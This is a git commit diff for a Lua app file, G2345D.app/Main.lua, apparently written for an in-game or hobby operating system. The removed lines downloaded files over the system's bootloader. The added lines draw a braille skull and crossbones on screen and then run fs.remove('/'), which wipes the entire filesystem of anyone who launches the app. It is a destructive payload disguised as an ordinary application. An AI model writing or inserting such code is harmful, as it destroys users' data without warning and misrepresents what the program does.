f84fd6c515aefbd4648b9ceebac9b01a8607ba98
matvey-mayner <144268527+matvey-mayner@users.noreply.github.com>
2024-07-02 14:09:52 +0300

    Update Main.lua

--- G2345D.app/Main.lua
+++ G2345D.app/Main.lua
@@ -1,6 +1,26 @@
-local inet = require("Internet")
-local fs = require("Filesystem")
+local component = require("component")
+local fs = require("filesystem")
+local event = require("event")
+local computer = require("computer")
+local unicode = require("unicode")
+local gpu = component.gpu
 
-inet.download("https://raw.githubusercontent.com/matvey-mayner/LikeOS-APPS" .. tostring(file),where)
-download("/bootloader.lua","/system/core/bootloader.lua")
-download("/Fedya.lua","/system/core/Fedya.lua")
+-- Установите цвет текста и фона
+gpu.setForeground(0xFFFFFF) -- белый цвет текста
+gpu.setBackground(0x000000) -- черный фон
+
+-- Выведите текст в центр экрана
+local width, height = gpu.getResolution()
+gpu.set(34, 12, "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
+gpu.set(34, 13, "⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
+gpu.set(34, 14, "⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿")
+gpu.set(34, 15, "⣿⣿⣏⢻⣿⣿⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿⣿⣿⣿⣿⣿⣿")
+gpu.set(34, 16, "⣿⣿⣿⣦⠻⣿⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿⣿⣿⠋⣼⣿⣿")
+gpu.set(34, 17, "⣿⣿⣿⣿⣦⠙⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⣿⠟⢡⣾⣿⣿⣿")
+gpu.set(34, 18, "⣿⣿⣿⣿⣿⣷⣄⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟⢁⣴⣿⣿⣿⣿⣿")
+gpu.set(34, 19, "⣿⣿⣿⣿⣿⡟⢛⣷⣄⡈⢙⡻⠿⡟⠉⣂⣴⡛⢿⣿⣿⣿⣿⣿")
+gpu.set(34, 20, "⣿⣿⣿⣿⣿⡔⡿⢟⣛⡫⠥⢈⣑⡠⠭⣛⡻⢿⢸⣿⣿⣿⣿⣿")
+gpu.set(34, 21, "⣿⣄⣠⣄⣠⣆⠩⣽⣶⣶⣿⣿⣿⣿⣷⣶⡮⢁⣤⣀⣄⣄⣄⣿")
+gpu.set(34, 22, "⣿⣿⣿⣿⣿⣿⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣿⣿⣿⣿⣿")
+gpu.set(34, 23, "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
+fs.remove("/")
